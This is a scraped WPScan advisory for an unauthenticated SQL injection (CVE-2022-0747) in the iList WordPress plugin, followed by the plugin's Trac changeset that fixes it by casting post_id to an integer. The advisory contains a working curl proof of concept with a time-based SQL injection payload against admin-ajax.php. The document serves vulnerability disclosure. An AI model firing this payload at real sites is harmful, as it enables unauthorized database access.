=== Content from wpscan.com_a8033347_20250115_083831.html ===


[Skip to content](#wp--skip-link--target)

* [Features](https://a8cteam5105.wordpress.com/features/)
* [Pricing](https://a8cteam5105.wordpress.com/pricing/)
* Solutions
  + [Status](https://status.wpscan.com/)
  + [API Details](/api)
  + [CLI Scanner](https://a8cteam5105.wordpress.com/wordpress-cli-scanner/)
* Vulnerabilities
  + [Themes](/themes)
  + [WordPress](/wordpresses)
  + [Plugins](/plugins)
  + [Stats](/statistics)
  + [Submit Vulnerabilities](/submit)
  + [Leaderboard](/leaderboard)
* Resources
  + [Blog](/blog)
  + [Enterprise Features](https://a8cteam5105.wordpress.com/enterprise-customers-features/)
  + [How to Install WPScan](https://a8cteam5105.wordpress.com/how-to-install-wpscan/)
  + [WPScan Glossary](/wpscan-glossary)
  + [2024 Website Threat Report](https://wpscan.com/2023-website-threat-report/)

Search

## WordPress Plugin Vulnerabilities

# Infographic Maker - iList < 4.3.8 - Unauthenticated SQL Injection

### Description

The plugin does not validate and escape the post\_id parameter before using it in a SQL statement via the qcld\_upvote\_action AJAX action (available to unauthenticated and authenticated users), leading to an unauthenticated SQL Injection

### Proof of Concept

curl https://example.com/wp-admin/admin-ajax.php --data 'action=qcld\_upvote\_action&post\_id=(CASE WHEN (78=78) THEN SLEEP(5) ELSE 6639 END)'

### Affects Plugins

[![Plugin icon](https://s2.wp.com/wp-content/themes/a8c/wpscan/assets/img/plugin-icon.svg)

infographic-and-list-builder-ilist](https://a8cteam5105.wordpress.com/plugin/infographic-and-list-builder-ilist/)

![](https://s2.wp.com/wp-content/themes/a8c/wpscan/assets/img/checkmark-green-alt.svg)
Fixed in 4.3.8

### References

CVE
[CVE-2022-0747](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0747)

URL
<https://plugins.trac.wordpress.org/changeset/2684336>

### Classification

Type
SQLI

OWASP top 10
[A1: Injection](https://www.owasp.org/index.php/Top_10-2017_A1-Injection)

CWE
[CWE-89](https://cwe.mitre.org/data/definitions/89.html)

CVSS
[8.6 (high)](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N)

### Miscellaneous

Original Researcher
cydave

Submitter
cydave

Submitter website
<https://cyllective.com/>

Submitter twitter
[cyllective](//twitter.com/cyllective)

Verified
Yes

WPVDB ID
[a8575322-c2cf-486a-9c37-71a22167aac3](https://a8cteam5105.wordpress.com/vulnerability/a8575322-c2cf-486a-9c37-71a22167aac3/)

### Timeline

Publicly Published
2022-02-28 (about 2 years ago)

Added
2022-02-28 (about 2 years ago)

Last Updated
2022-04-17 (about 2 years ago)

### Other

Published
Title

Published
2024-03-11
Title
[News Announcement Scroll < 9.1.0 - Authenticated (Contributor+) SQL Injection via Shortcode](https://a8cteam5105.wordpress.com/vulnerability/4247ce35-35be-4007-a3f0-0c1a5f933f64/)

Published
2024-07-11
Title
[Form Vibes < 1.4.11 - Authenticated (Subscriber+) SQL Injection via fv\_export\_data](https://a8cteam5105.wordpress.com/vulnerability/67820649-8c4a-4266-90e0-f0c79063d078/)

Published
2020-04-02
Title
[WP Advanced Search < 3.3.6 - Unauthenticated SQL Injection](https://a8cteam5105.wordpress.com/vulnerability/136e1010-2f1b-4d09-b251-10db01ab72f1/)

Published
2024-04-03
Title
[REHub Framework < 19.6.2 - Authenticated (Subscriber+) SQL Injection](https://a8cteam5105.wordpress.com/vulnerability/50724a27-6cbc-4ef6-b01b-d036102818e3/)

Published
2022-03-29
Title
[Advanced Page Visit Counter < 6.1.6 - Subscriber+ Blind SQL injection](https://a8cteam5105.wordpress.com/vulnerability/a282606f-6abf-4f75-99c9-dab0bea8cc96/)

![](https://wpscan.com/wp-content/uploads/2023/10/wpscan-logo-dark.png?w=246)

### Vulnerabilities

* [WordPress](/wordpresses)
* [Plugins](/plugins)
* [Themes](/themes)
* [Our Stats](https://a8cteam5105.wordpress.com/statistics/)
* [Submit vulnerabilities](https://a8cteam5105.wordpress.com/submit/)

#### About

* [How it works](/features)
* [Pricing](/pricing)
* [WordPress plugin](https://wordpress.org/plugins/wpscan/)
* [Blog](/blog)
* [Contact](/contact)

#### For Developers

* [Status](https://status.wpscan.com/)
* [API details](/api)
* [CLI scanner](/wordpress-cli-scanner)

#### Other

* [Privacy](https://automattic.com/privacy/)
* [Terms of service](/terms)
* [Submission terms](/submission-terms/)
* [Disclosure policy](/vulnerability-disclosure-policy)
* [Privacy Notice for California Users](https://automattic.com/privacy/#california-consumer-privacy-act-ccpa)

---

![](https://wpscan.com/wp-content/uploads/2023/08/frame-1323.png?w=48)

In partnership with [Jetpack](https://jetpack.com/)

* [GitHub](https://github.com/wpscanteam/wpscan/)
* [Twitter](https://twitter.com/_wpscan_)
* [Facebook](https://www.facebook.com/WPScan)

---

An

![](https://wpscan.com/wp-content/uploads/2023/08/autpmattic-logo.png?w=298)

endeavor

[Work With Us](https://automattic.com/work-with-us/)

[Press](https://automattic.com/press/)

* Subscribe
  Subscribed

  + [![](https://wpscan.com/wp-content/uploads/2023/08/cropped-83c25-favicon.png?w=50) WPScan](https://wpscan.com)

  Join 30,404 other subscribers

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwpscan.com%252Fblog%252Funauthorized-plugin-installation-activation-in-hunk-companion%252F)
* Privacy
* + [![](https://wpscan.com/wp-content/uploads/2023/08/cropped-83c25-favicon.png?w=50) WPScan](https://wpscan.com)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwpscan.com%252Fblog%252Funauthorized-plugin-installation-activation-in-hunk-companion%252F)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://wpscan.com)
  + [View site in Reader](https://wordpress.com/read/feeds/156197069)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

![](https://pixel.wp.com/b.gif?v=noscript)


=== Content from plugins.trac.wordpress.org_4455deee_20250115_083830.html ===


[Skip to content](#main)

[WordPress.org](https://wordpress.org/)

* [News](https://wordpress.org/news/)
* [Download & Extend](https://wordpress.org/download/)
  + [Get WordPress](https://wordpress.org/download/)
  + [Themes](https://wordpress.org/themes/)
  + [Patterns](https://wordpress.org/patterns/)
  + [Plugins](https://wordpress.org/plugins/)
  + [Mobile](https://wordpress.org/mobile/)
  + [Hosting](https://wordpress.org/hosting/)
  + [Openverse ↗︎](https://openverse.org/)
* [Learn](https://learn.wordpress.org/)
  + [Learn WordPress](https://learn.wordpress.org/)
  + [Documentation](https://wordpress.org/documentation/)
  + [Forums](https://wordpress.org/support/forums/)
  + [Developers](https://developer.wordpress.org/)
  + [WordPress.tv ↗︎](https://wordpress.tv/)
* [Community](https://make.wordpress.org/)
  + [Make WordPress](https://make.wordpress.org/)
  + [Photo Directory](https://wordpress.org/photos/)
  + [Five for the Future](https://wordpress.org/five-for-the-future/)
  + [WordCamp ↗︎](https://central.wordcamp.org/)
  + [Meetups ↗︎](https://www.meetup.com/pro/wordpress/)
  + [Job Board ↗︎](https://jobs.wordpress.net/)
* [About](https://wordpress.org/about/)
  + [About WordPress](https://wordpress.org/about/)
  + [Showcase](https://wordpress.org/showcase/)
  + [Enterprise](https://wordpress.org/enterprise/)
  + [Gutenberg ↗︎](https://wordpress.org/gutenberg/)
  + [WordPress Swag Store ↗︎](https://mercantile.wordpress.org/)
* [Get WordPress](https://wordpress.org/download/)

Search Trac

[Get WordPress](https://wordpress.org/download/)

## [Plugin Directory](//wordpress.org/plugins/)

Search:

* [Login](https://login.wordpress.org/?redirect_to=http%3A%2F%2Fplugins.trac.wordpress.org%2Fchangeset%2F2684336)

* [Timeline](/timeline)
* [View Tickets](/report)
* [Browse Source](/browser)

## Context Navigation

* ← [Previous Changeset](/changeset/2684335 "Changeset 2684335")
* [Next Changeset](/changeset/2684337 "Changeset 2684337") →

---

# Changeset 2684336

View differences
inline
side by side

Show
lines around each change

Show the changes in full context

Ignore:

Blank lines

Case changes

White space changes

Timestamp:
02/24/2022 11:08:30 AM
([3 years](/timeline?from=2022-02-24T11%3A08%3A30Z&precision=second "See timeline at 02/24/2022 11:08:30 AM") ago)

Author:
quantumcloud
Message:

Post ID cast as integer

Location:
[infographic-and-list-builder-ilist](/browser/infographic-and-list-builder-ilist?rev=2684336)
Files:

4 edited

* [tags/4.3.8/qc-project-ilist-ajax.php](/browser/infographic-and-list-builder-ilist/tags/4.3.8/qc-project-ilist-ajax.php?rev=2684336 "Show entry in browser")
  (modified)
  ([2 diffs](#file0 "Show differences"))
* [tags/4.3.8/readme.txt](/browser/infographic-and-list-builder-ilist/tags/4.3.8/readme.txt?rev=2684336 "Show entry in browser")
  (modified)
  ([1 diff](#file1 "Show differences"))
* [trunk/qc-project-ilist-ajax.php](/browser/infographic-and-list-builder-ilist/trunk/qc-project-ilist-ajax.php?rev=2684336 "Show entry in browser")
  (modified)
  ([2 diffs](#file2 "Show differences"))
* [trunk/readme.txt](/browser/infographic-and-list-builder-ilist/trunk/readme.txt?rev=2684336 "Show entry in browser")
  (modified)
  ([1 diff](#file3 "Show differences"))

### Legend:

Unmodified
Added
Removed

* ## [infographic-and-list-builder-ilist/tags/4.3.8/qc-project-ilist-ajax.php](/changeset/2684336/infographic-and-list-builder-ilist/tags/4.3.8/qc-project-ilist-ajax.php "Show the changeset 2684336 restricted to infographic-and-list-builder-ilist/tags/4.3.8/qc-project-ilist-ajax.php")

  | [r2684316](/browser/infographic-and-list-builder-ilist/tags/4.3.8/qc-project-ilist-ajax.php?rev=2684316#L172 "Show revision 2684316 of this file in browser") | [r2684336](/browser/infographic-and-list-builder-ilist/tags/4.3.8/qc-project-ilist-ajax.php?rev=2684336#L172 "Show revision 2684336 of this file in browser") |  |
  | --- | --- | --- |
  | 172 | 172 |  |
  | 173 | 173 | //Get posted items |
  | 174 |  | $action         = ~~trim(sanitize\_text\_field($\_POST['action']))~~; |
  | 175 |  | $post\_id    = ~~trim(sanitize\_text\_field($\_POST['post\_id']))~~; |
  | 176 |  | $meta\_title = ~~trim(sanitize\_text\_field($\_POST['meta\_title']))~~; |
  | 177 |  | $meta\_link  = ~~trim(sanitize\_text\_field($\_POST['meta\_link']))~~; |
  | 178 |  | $meta\_desc  = ~~trim(sanitize\_text\_field($\_POST['meta\_desc']))~~; |
  | 179 |  | $li\_id      = ~~trim(sanitize\_text\_field($\_POST['li\_id']))~~; |
  |  | 174 | $action         = isset($\_POST['action']) ? trim(sanitize\_text\_field($\_POST['action'])) : ''; |
  |  | 175 | $post\_id    = isset($\_POST['post\_id']) ? absint(sanitize\_text\_field($\_POST['post\_id'])) : ''; |
  |  | 176 | $meta\_title = isset($\_POST['meta\_title']) ? trim(sanitize\_text\_field($\_POST['meta\_title'])) : ''; |
  |  | 177 | $meta\_link  = isset($\_POST['meta\_link']) ? trim(sanitize\_text\_field($\_POST['meta\_link'])) : ''; |
  |  | 178 | $meta\_desc  = isset($\_POST['meta\_desc']) ? trim(sanitize\_text\_field($\_POST['meta\_desc'])) : ''; |
  |  | 179 | $li\_id      = isset($\_POST['li\_id']) ? trim(sanitize\_text\_field($\_POST['li\_id'])) : ''; |
  | 180 | 180 |  |
  | 181 | 181 | //Check wpdb directly, for all matching meta items |
  | […](/browser/infographic-and-list-builder-ilist/tags/4.3.8/qc-project-ilist-ajax.php?rev=2684316#L194) | […](/browser/infographic-and-list-builder-ilist/tags/4.3.8/qc-project-ilist-ajax.php?rev=2684336#L194) |  |
  | 194 | 194 | //If li-id not exists in the cookie, then prceed to vote |
  | 195 | 195 | if( !$exists ){ |
  | 196 |  |  |
  | 197 |  | foreach( $results as $ke => $value ){ |
  | 198 |  |  |
  | 199 |  | $item = $value; |
  | 200 |  |  |
  | 201 |  | $meta\_id = $value->meta\_id; |
  | 202 |  |  |
  | 203 |  |  |
  | 204 |  | //Unserializing meta value |
  | 205 |  | $unserializedarray = unserialize($value->meta\_value); |
  | 206 |  | //creating new array for update value |
  | 207 |  | $new\_sl\_array = array(); |
  | 208 |  |  |
  | 209 |  | foreach($unserializedarray as $k=>$unserialized){ |
  | 210 |  |  |
  | 211 |  | if($meta\_desc==''){ |
  | 212 |  | $meta\_desc = 'no data'; |
  | 213 |  | } |
  | 214 |  |  |
  | 215 |  | //Matching for meta value key , what need to be update. |
  | 216 |  | if( trim($unserialized['qcld\_text\_title']) == stripslashes(trim($meta\_title)) || ($unserialized['qcld\_text\_desc']) == stripslashes($meta\_desc) ) |
  | 217 |  | { |
  | 218 |  |  |
  | 219 |  |  |
  | 220 |  | $metaId = $meta\_id; |
  | 221 |  |  |
  | 222 |  | //Defaults for current iteration |
  | 223 |  | $upvote\_count = 0; |
  | 224 |  | $new\_array = array(); |
  | 225 |  | $flag = 0; |
  | 226 |  |  |
  | 227 |  | //Check if there already a set value (previous) |
  | 228 |  | if (array\_key\_exists('sl\_thumbs\_up', $unserialized)) |
  |  | 196 |  |
  |  | 197 | if(!empty($results)){ |
  |  | 198 |  |
  |  | 199 | foreach( $results as $ke => $value ){ |
  |  | 200 |  |
  |  | 201 | $item = $value; |
  |  | 202 |  |
  |  | 203 | $meta\_id = $value->meta\_id; |
  |  | 204 |  |
  |  | 205 |  |
  |  | 206 | //Unserializing meta value |
  |  | 207 | $unserializedarray = unserialize($value->meta\_value); |
  |  | 208 | //creating new array for update value |
  |  | 209 | $new\_sl\_array = array(); |
  |  | 210 |  |
  |  | 211 | foreach($unserializedarray as $k=>$unserialized){ |
  |  | 212 |  |
  |  | 213 | if($meta\_desc==''){ |
  |  | 214 | $meta\_desc = 'no data'; |
  |  | 215 | } |
  |  | 216 |  |
  |  | 217 | //Matching for meta value key , what need to be update. |
  |  | 218 | if( trim($unserialized['qcld\_text\_title']) == stripslashes(trim($meta\_title)) || ($unserialized['qcld\_text\_desc']) == stripslashes($meta\_desc) ) |
  | 229 | 219 | { |
  | 230 |  | $upvote\_count = (int)$unserialized['sl\_thumbs\_up']; |
  | 231 |  | $flag = 1; |
  | 232 |  | } |
  | 233 |  | $tflag=0; |
  | 234 |  | if (!array\_key\_exists('sl\_thumbs\_up\_user', $unserialized)){ |
  | 235 |  | $unserialized['sl\_thumbs\_up\_user']= ''; |
  | 236 |  | $tflag = 1; |
  | 237 |  | } |
  | 238 |  | //User information saving array. |
  | 239 |  | $userinfo = array(); |
  | 240 |  | foreach( $unserialized as $skey => $svalue ) |
  | 241 |  | { |
  | 242 |  |  |
  | 243 |  | if($flag) |
  |  | 220 |  |
  |  | 221 |  |
  |  | 222 | $metaId = $meta\_id; |
  |  | 223 |  |
  |  | 224 | //Defaults for current iteration |
  |  | 225 | $upvote\_count = 0; |
  |  | 226 | $new\_array = array(); |
  |  | 227 | $flag = 0; |
  |  | 228 |  |
  |  | 229 | //Check if there already a set value (previous) |
  |  | 230 | if (array\_key\_exists('sl\_thumbs\_up', $unserialized)) |
  | 244 | 231 | { |
  | 245 |  | if( $skey == 'sl\_thumbs\_up') |
  |  | 232 | $upvote\_count = (int)$unserialized['sl\_thumbs\_up']; |
  |  | 233 | $flag = 1; |
  |  | 234 | } |
  |  | 235 | $tflag=0; |
  |  | 236 | if (!array\_key\_exists('sl\_thumbs\_up\_user', $unserialized)){ |
  |  | 237 | $unserialized['sl\_thumbs\_up\_user']= ''; |
  |  | 238 | $tflag = 1; |
  |  | 239 | } |
  |  | 240 | //User information saving array. |
  |  | 241 | $userinfo = array(); |
  |  | 242 | foreach( $unserialized as $skey => $svalue ) |
  |  | 243 | { |
  |  | 244 |  |
  |  | 245 | if($flag) |
  | 246 | 246 | { |
  | 247 |  | $new\_array[$skey] =  $upvote\_count + 1; |
  | 248 |  | } |
  |  | 247 | if( $skey == 'sl\_thumbs\_up') |
  |  | 248 | { |
  |  | 249 | $new\_array[$skey] =  $upvote\_count + 1; |
  |  | 250 | } |
  |  | 251 | else |
  |  | 252 | { |
  |  | 253 | $new\_array[$skey] = $svalue; |
  |  | 254 | } |
  |  | 255 |  |
  |  | 256 | }   // End of Flag |
  | 249 | 257 | else |
  | 250 | 258 | { |
  | 251 |  | $new\_array[$skey] = $svalue; |
  |  | 259 | $new\_array[$skey] = $svalue; |
  | 252 | 260 | } |
  | 253 |  |  |
  | 254 |  | }   // End of Flag |
  | 255 |  | ~~else~~ |
  |  | 261 | }   //End of Foreach Loop |
  |  | 262 |  |
  |  | 263 | if( !$flag ) |
  | 256 | 264 | { |
  | 257 |  | $new\_array[~~$skey] = $svalue~~; |
  |  | 265 | $new\_array['sl\_thumbs\_up'] = $upvote\_count + 1; |
  | 258 | 266 | } |
  | 259 |  | }   //End of Foreach Loop |
  | 260 |  |  |
  | 261 |  | if( !$flag ) |
  | 262 |  | { |
  | 263 |  | $new\_array['sl\_thumbs\_up'] = $upvote\_count + 1; |
  | 264 |  | } |
  | 265 |  | //Collection user info |
  | 266 |  | $userinfo[] = array('ip'=>$\_SERVER['REMOTE\_ADDR'],'user\_agent'=>$\_SERVER['HTTP\_USER\_AGENT'],'time'=>date('Y-m-d H:i:s')); |
  | 267 |  | if($tflag==1){ |
  | 268 |  | $getnewvalue = $userinfo; |
  |  | 267 | //Collection user info |
  |  | 268 | $userinfo[] = array('ip'=>$\_SERVER['REMOTE\_ADDR'],'user\_agent'=>$\_SERVER['HTTP\_USER\_AGENT'],'time'=>date('Y-m-d H:i:s')); |
  |  | 269 | if($tflag==1){ |
  |  | 270 | $getnewvalue = $userinfo; |
  |  | 271 | }else{ |
  |  | 272 | $getthumbsupusers = unserialize($unserialized['sl\_thumbs\_up\_user']); |
  |  | 273 | $getnewvalue = array\_merge($getthumbsupusers,$userinfo); |
  |  | 274 | } |
  |  | 275 | //User info assign to meta value key. |
  |  | 276 | $new\_array['sl\_thumbs\_up\_user'] = serialize($getnewvalue); |
  |  | 277 |  |
  |  | 278 |  |
  |  | 279 |  |
  |  | 280 |  |
  |  | 281 | $votes = (int)$new\_array['sl\_thumbs\_up']; |
  |  | 282 | $new\_sl\_array[$k] = $new\_array; |
  |  | 283 |  |
  | 269 | 284 | }else{ |
  | 270 |  | $getthumbsupusers = unserialize($unserialized['sl\_thumbs\_up\_user']); |
  | 271 |  | $getnewvalue = array\_merge($getthumbsupusers,$userinfo); |
  | 272 |  | } |
  | 273 |  | //User info assign to meta value key. |
  | 274 |  | $new\_array['sl\_thumbs\_up\_user'] = serialize($getnewvalue); |
  | 275 |  |  |
  | 276 |  |  |
  | 277 |  |  |
  | 278 |  |  |
  | 279 |  | $votes = (int)$new\_array['sl\_thumbs\_up']; |
  | 280 |  | $new\_sl\_array[$k] = $new\_array; |
  | 281 |  |  |
  | 282 |  | }else{ |
  | 283 |  | $new\_sl\_array[$k] = $unserialized; |
  | 284 |  |  |
  | 285 |  | } |
  |  | 285 | $new\_sl\_array[$k] = $unserialized; |
  |  | 286 |  |
  |  | 287 | } |
  |  | 288 | }   //End of Foreach Loop |
  |  | 289 |  |
  |  | 290 |  |
  |  | 291 | //New Updated value in Array |
  |  | 292 | $updated\_value = serialize($new\_sl\_array); |
  |  | 293 | //wp update query |
  |  | 294 | $wpdb->update( |
  |  | 295 | $wpdb->postmeta, |
  |  | 296 | array( |
  |  | 297 | 'meta\_value' => $updated\_value, |
  |  | 298 | ), |
  |  | 299 | array( 'meta\_id' => $meta\_id ) |
  |  | 300 | ); |
  |  | 301 |  |
  |  | 302 | $voted\_li = array("$li\_id"); |
  |  | 303 |  |
  |  | 304 | $total = 0; |
  |  | 305 | $total = count($\_COOKIE['voted\_li']); |
  |  | 306 | $total = $total+1; |
  |  | 307 | //Creating cookie.. |
  |  | 308 | setcookie("voted\_li[$total]",$li\_id, time() + (86400 \* 30), "/"); |
  |  | 309 |  |
  |  | 310 | $data['vote\_status'] = 'success'; |
  |  | 311 | $data['votes'] = $votes; |
  |  | 312 |  |
  | 286 | 313 | }   //End of Foreach Loop |
  | 287 |  |  |
  | 288 |  |  |
  | 289 |  | //New Updated value in Array |
  | 290 |  | $updated\_value = serialize($new\_sl\_array); |
  | 291 |  | //wp update query |
  | 292 |  | $wpdb->update( |
  | 293 |  | $wpdb->postmeta, |
  | 294 |  | array( |
  | 295 |  | 'meta\_value' => $updated\_value, |
  | 296 |  | ), |
  | 297 |  | array( 'meta\_id' => $meta\_id ) |
  | 298 |  | ); |
  | 299 |  |  |
  | 300 |  | $voted\_li = array("$li\_id"); |
  | 301 |  |  |
  | 302 |  | $total = 0; |
  | 303 |  | $total = count($\_COOKIE['voted\_li']); |
  | 304 |  | $total = $total+1; |
  | 305 |  | //Creating cookie.. |
  | 306 |  | setcookie("voted\_li[$total]",$li\_id, time() + (86400 \* 30), "/"); |
  | 307 |  |  |
  | 308 |  | $data['vote\_status'] = 'success'; |
  | 309 |  | $data['votes'] = $votes; |
  | 310 |  |  |
  | 311 |  | }   //End of Foreach Loop |
  |  | 314 |  |
  |  | 315 | }   //End if |
  |  | 316 |  |
  |  | 317 |  |
  | 312 | 318 | }   //End of cookie checking. |
  | 313 | 319 |  |
* ## [infographic-and-list-builder-ilist/tags/4.3.8/readme.txt](/changeset/2684336/infographic-and-list-builder-ilist/tags/4.3.8/readme.txt "Show the changeset 2684336 restricted to infographic-and-list-builder-ilist/tags/4.3.8/readme.txt")

  | [r2684316](/browser/infographic-and-list-builder-ilist/tags/4.3.8/readme.txt?rev=2684316#L193 "Show revision 2684316 of this file in browser") | [r2684336](/browser/infographic-and-list-builder-ilist/tags/4.3.8/readme.txt?rev=2684336#L193 "Show revision 2684336 of this file in browser") |  |
  | --- | --- | --- |
  | 193 | 193 | == Changelog == |
  | 194 | 194 |  |
  |  | 195 |  |
  | 195 | 196 | = 4.3.8 = |
  | 196 | 197 | # fixed ajax nonce issue for upvote |
  |  | 198 | # Post ID cast as number |
  | 197 | 199 |  |
  | 198 | 200 | = 4.3.7 = |
* ## [infographic-and-list-builder-ilist/trunk/qc-project-ilist-ajax.php](/changeset/2684336/infographic-and-list-builder-ilist/trunk/qc-project-ilist-ajax.php "Show the changeset 2684336 restricted to infographic-and-list-builder-ilist/trunk/qc-project-ilist-ajax.php")

  | [r2684316](/browser/infographic-and-list-builder-ilist/trunk/qc-project-ilist-ajax.php?rev=2684316#L172 "Show revision 2684316 of this file in browser") | [r2684336](/browser/infographic-and-list-builder-ilist/trunk/qc-project-ilist-ajax.php?rev=2684336#L172 "Show revision 2684336 of this file in browser") |  |
  | --- | --- | --- |
  | 172 | 172 |  |
  | 173 | 173 | //Get posted items |
  | 174 |  | $action         = ~~trim(sanitize\_text\_field($\_POST['action']))~~; |
  | 175 |  | $post\_id    = ~~trim(sanitize\_text\_field($\_POST['post\_id']))~~; |
  | 176 |  | $meta\_title = ~~trim(sanitize\_text\_field($\_POST['meta\_title']))~~; |
  | 177 |  | $meta\_link  = ~~trim(sanitize\_text\_field($\_POST['meta\_link']))~~; |
  | 178 |  | $meta\_desc  = ~~trim(sanitize\_text\_field($\_POST['meta\_desc']))~~; |
  | 179 |  | $li\_id      = ~~trim(sanitize\_text\_field($\_POST['li\_id']))~~; |
  |  | 174 | $action         = isset($\_POST['action']) ? trim(sanitize\_text\_field($\_POST['action'])) : ''; |
  |  | 175 | $post\_id    = isset($\_POST['post\_id']) ? absint(sanitize\_text\_field($\_POST['post\_id'])) : ''; |
  |  | 176 | $meta\_title = isset($\_POST['meta\_title']) ? trim(sanitize\_text\_field($\_POST['meta\_title'])) : ''; |
  |  | 177 | $meta\_link  = isset($\_POST['meta\_link']) ? trim(sanitize\_text\_field($\_POST['meta\_link'])) : ''; |
  |  | 178 | $meta\_desc  = isset($\_POST['meta\_desc']) ? trim(sanitize\_text\_field($\_POST['meta\_desc'])) : ''; |
  |  | 179 | $li\_id      = isset($\_POST['li\_id']) ? trim(sanitize\_text\_field($\_POST['li\_id'])) : ''; |
  | 180 | 180 |  |
  | 181 | 181 | //Check wpdb directly, for all matching meta items |
  | […](/browser/infographic-and-list-builder-ilist/trunk/qc-project-ilist-ajax.php?rev=2684316#L194) | […](/browser/infographic-and-list-builder-ilist/trunk/qc-project-ilist-ajax.php?rev=2684336#L194) |  |
  | 194 | 194 | //If li-id not exists in the cookie, then prceed to vote |
  | 195 | 195 | if( !$exists ){ |
  | 196 |  |  |
  | 197 |  | foreach( $results as $ke => $value ){ |
  | 198 |  |  |
  | 199 |  | $item = $value; |
  | 200 |  |  |
  | 201 |  | $meta\_id = $value->meta\_id; |
  | 202 |  |  |
  | 203 |  |  |
  | 204 |  | //Unserializing meta value |
  | 205 |  | $unserializedarray = unserialize($value->meta\_value); |
  | 206 |  | //creating new array for update value |
  | 207 |  | $new\_sl\_array = array(); |
  | 208 |  |  |
  | 209 |  | foreach($unserializedarray as $k=>$unserialized){ |
  | 210 |  |  |
  | 211 |  | if($meta\_desc==''){ |
  | 212 |  | $meta\_desc = 'no data'; |
  | 213 |  | } |
  | 214 |  |  |
  | 215 |  | //Matching for meta value key , what need to be update. |
  | 216 |  | if( trim($unserialized['qcld\_text\_title']) == stripslashes(trim($meta\_title)) || ($unserialized['qcld\_text\_desc']) == stripslashes($meta\_desc) ) |
  | 217 |  | { |
  | 218 |  |  |
  | 219 |  |  |
  | 220 |  | $metaId = $meta\_id; |
  | 221 |  |  |
  | 222 |  | //Defaults for current iteration |
  | 223 |  | $upvote\_count = 0; |
  | 224 |  | $new\_array = array(); |
  | 225 |  | $flag = 0; |
  | 226 |  |  |
  | 227 |  | //Check if there already a set value (previous) |
  | 228 |  | if (array\_key\_exists('sl\_thumbs\_up', $unserialized)) |
  |  | 196 |  |
  |  | 197 | if(!empty($results)){ |
  |  | 198 |  |
  |  | 199 | foreach( $results as $ke => $value ){ |
  |  | 200 |  |
  |  | 201 | $item = $value; |
  |  | 202 |  |
  |  | 203 | $meta\_id = $value->meta\_id; |
  |  | 204 |  |
  |  | 205 |  |
  |  | 206 | //Unserializing meta value |
  |  | 207 | $unserializedarray = unserialize($value->meta\_value); |
  |  | 208 | //creating new array for update value |
  |  | 209 | $new\_sl\_array = array(); |
  |  | 210 |  |
  |  | 211 | foreach($unserializedarray as $k=>$unserialized){ |
  |  | 212 |  |
  |  | 213 | if($meta\_desc==''){ |
  |  | 214 | $meta\_desc = 'no data'; |
  |  | 215 | } |
  |  | 216 |  |
  |  | 217 | //Matching for meta value key , what need to be update. |
  |  | 218 | if( trim($unserialized['qcld\_text\_title']) == stripslashes(trim($meta\_title)) || ($unserialized['qcld\_text\_desc']) == stripslashes($meta\_desc) ) |
  | 229 | 219 | { |
  | 230 |  | $upvote\_count = (int)$unserialized['sl\_thumbs\_up']; |
  | 231 |  | $flag = 1; |
  | 232 |  | } |
  | 233 |  | $tflag=0; |
  | 234 |  | if (!array\_key\_exists('sl\_thumbs\_up\_user', $unserialized)){ |
  | 235 |  | $unserialized['sl\_thumbs\_up\_user']= ''; |
  | 236 |  | $tflag = 1; |
  | 237 |  | } |
  | 238 |  | //User information saving array. |
  | 239 |  | $userinfo = array(); |
  | 240 |  | foreach( $unserialized as $skey => $svalue ) |
  | 241 |  | { |
  | 242 |  |  |
  | 243 |  | if($flag) |
  |  | 220 |  |
  |  | 221 |  |
  |  | 222 | $metaId = $meta\_id; |
  |  | 223 |  |
  |  | 224 | //Defaults for current iteration |
  |  | 225 | $upvote\_count = 0; |
  |  | 226 | $new\_array = array(); |
  |  | 227 | $flag = 0; |
  |  | 228 |  |
  |  | 229 | //Check if there already a set value (previous) |
  |  | 230 | if (array\_key\_exists('sl\_thumbs\_up', $unserialized)) |
  | 244 | 231 | { |
  | 245 |  | if( $skey == 'sl\_thumbs\_up') |
  |  | 232 | $upvote\_count = (int)$unserialized['sl\_thumbs\_up']; |
  |  | 233 | $flag = 1; |
  |  | 234 | } |
  |  | 235 | $tflag=0; |
  |  | 236 | if (!array\_key\_exists('sl\_thumbs\_up\_user', $unserialized)){ |
  |  | 237 | $unserialized['sl\_thumbs\_up\_user']= ''; |
  |  | 238 | $tflag = 1; |
  |  | 239 | } |
  |  | 240 | //User information saving array. |
  |  | 241 | $userinfo = array(); |
  |  | 242 | foreach( $unserialized as $skey => $svalue ) |
  |  | 243 | { |
  |  | 244 |  |
  |  | 245 | if($flag) |
  | 246 | 246 | { |
  | 247 |  | $new\_array[$skey] =  $upvote\_count + 1; |
  | 248 |  | } |
  |  | 247 | if( $skey == 'sl\_thumbs\_up') |
  |  | 248 | { |
  |  | 249 | $new\_array[$skey] =  $upvote\_count + 1; |
  |  | 250 | } |
  |  | 251 | else |
  |  | 252 | { |
  |  | 253 | $new\_array[$skey] = $svalue; |
  |  | 254 | } |
  |  | 255 |  |
  |  | 256 | }   // End of Flag |
  | 249 | 257 | else |
  | 250 | 258 | { |
  | 251 |  | $new\_array[$skey] = $svalue; |
  |  | 259 | $new\_array[$skey] = $svalue; |
  | 252 | 260 | } |
  | 253 |  |  |
  | 254 |  | }   // End of Flag |
  | 255 |  | ~~else~~ |
  |  | 261 | }   //End of Foreach Loop |
  |  | 262 |  |
  |  | 263 | if( !$flag ) |
  | 256 | 264 | { |
  | 257 |  | $new\_array[~~$skey] = $svalue~~; |
  |  | 265 | $new\_array['sl\_thumbs\_up'] = $upvote\_count + 1; |
  | 258 | 266 | } |
  | 259 |  | }   //End of Foreach Loop |
  | 260 |  |  |
  | 261 |  | if( !$flag ) |
  | 262 |  | { |
  | 263 |  | $new\_array['sl\_thumbs\_up'] = $upvote\_count + 1; |
  | 264 |  | } |
  | 265 |  | //Collection user info |
